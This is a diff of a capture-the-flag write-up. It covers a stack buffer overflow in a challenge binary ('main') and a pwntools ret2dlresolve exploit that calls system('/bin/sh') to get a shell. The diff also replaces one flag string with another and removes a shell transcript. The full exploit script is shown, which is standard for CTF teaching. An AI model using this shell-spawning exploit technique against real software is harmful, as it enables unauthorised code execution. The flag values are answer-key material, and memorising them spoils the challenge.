@@ -42,20 +42,6 @@ $ pwn checksec main
 
 Reverse engineering the binary shows the vulnerability resides in the `user_input()` function:
 
-### main()
-
-```c
-int __fastcall main(int argc, const char **argv, const char **envp)
-{
-  setup(argc, argv, envp);
-  print_logo();
-  write(1, "\n>> Network relay handshake initiated. Input routing key to proceed.\n", 0x45uLL);
-  user_input();
-  key_checker();
-  return 0;
-}
-```
-
 ### user_input()
 
 ```c
@@ -65,6 +51,8 @@ ssize_t user_input()
   return read(0, buf, 0xC8uLL);  // Reads 200 bytes into a 64-byte buffer!
 }
 ```
+
+![Alt text](img/3.png)
 
 - This function reads **200 bytes** into a buffer that's only 64 bytes long, introducing a **classic stack-based buffer overflow**.
 - The binary has **no stack canary**, making the overflow straightforward to exploit.
@@ -113,59 +101,73 @@ We solve this challenge using **`ret2dlresolve`**, a powerful dynamic linker res
 
 ```python
 #!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+# This exploit template was generated via:
+# $ pwn template
 from pwn import *
 
-context.binary = exe = ELF('./main')
-context.terminal = ['tmux', 'splitw', '-h']
+# Set up pwntools for the correct architecture
+exe = context.binary = ELF(args.EXE or 'main')
+
+# Many built-in settings can be controlled on the command-line and show up
+# in "args".  For example, to dump all data sent/received, and disable ASLR
+# for all created processes...
+# ./exploit.py DEBUG NOASLR
+
+
 
 def start(argv=[], *a, **kw):
+    '''Start the exploit against the target.'''
     if args.GDB:
-        return gdb.debug([exe.path] + argv, gdbscript='continue', *a, **kw)
+        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
     else:
         return process([exe.path] + argv, *a, **kw)
+
+# Specify your GDB script here for debugging
+# GDB will be launched if the exploit is run via e.g.
+# ./exploit.py GDB
+gdbscript = '''
+tbreak main
+continue
+'''.format(**locals())
+
+#===========================================================
+#                    EXPLOIT GOES HERE
+#===========================================================
+# Arch:     amd64-64-little
+# RELRO:      Partial RELRO
+# Stack:      No canary found
+# NX:         NX enabled
+# PIE:        No PIE (0x400000)
+# Stripped:   No
 
 io = start()
 
 rop = ROP(exe)
+
 dlresolve = Ret2dlresolvePayload(exe, symbol='system', args=['/bin/sh'])
-
-rop.raw(b'A' * 72)  # Overflow offset
-rop.read(0, dlresolve.data_addr)  # Write forged structures into memory
-rop.ret2dlresolve(dlresolve)      # Trigger dynamic linker resolution
-
-log.info("ROP Chain:\n" + rop.dump())
-
+rop.raw('A' * 72)
+rop.read(0, dlresolve.data_addr)
+rop.ret2dlresolve(dlresolve)
+log.info(rop.dump())
 io.sendline(rop.chain())
-io.sendline(dlresolve.payload)  # Send second-stage payload
+io.sendline(dlresolve.payload)
 
 io.interactive()
+
+
 ```
 
 ---
 
 ## Result
 
-After executing the exploit, we successfully resolve and call `system("/bin/sh")` using only what’s available in the binary:
-
-```
-$ ./exploit.py
-[*] Switching to interactive mode
-$ whoami
-dexter
-$ ls
-flag.txt
-$ cat flag.txt
-RedPointer{dlr3s0lv3_w1ns_4gain}
-```
+After executing the exploit, we successfully resolve and call `system("/bin/sh")`.
 
 ---
 
 ## FLAG
 
 ```
-RedPointer{dlr3s0lv3_w1ns_4gain}
+RedPointer{HelloPhantom!23}
 ```
-
----
-
-Let me know if you'd like this in a downloadable `README.md`, image mockups replaced, or integrated into a multi-challenge writeup.
